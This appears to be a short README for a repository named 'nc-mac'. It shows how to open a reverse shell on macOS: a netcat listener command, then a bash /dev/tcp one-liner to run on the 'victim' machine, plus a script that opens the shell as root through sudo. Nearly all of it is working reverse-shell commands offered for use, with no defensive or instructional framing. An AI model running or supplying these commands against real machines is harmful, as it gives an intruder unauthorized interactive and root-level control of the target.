# nc-mac
A simple NetCat alternative for MacOS

## On the listener's machine:

You can simply run the command

```
nc -lnvp 69
```

this will set up a listener that will run until a connection disconnects

## On the "victim"'s machine:

You can run
```
bash -i >& /dev/tcp/127.0.0.1/69 0>&1
```
or set up a fancy shell file like I have:

```sh
#!/bin/bash

if [ "$1" == "root" ]; then
    sudo bash -i >& /dev/tcp/127.0.0.1/69 0>&1
else
    bash -i >& /dev/tcp/127.0.0.1/69 0>&1
fi
```

this is basically the equivelent of running nc with the `-e` switch on linux, but on mac

cool right?
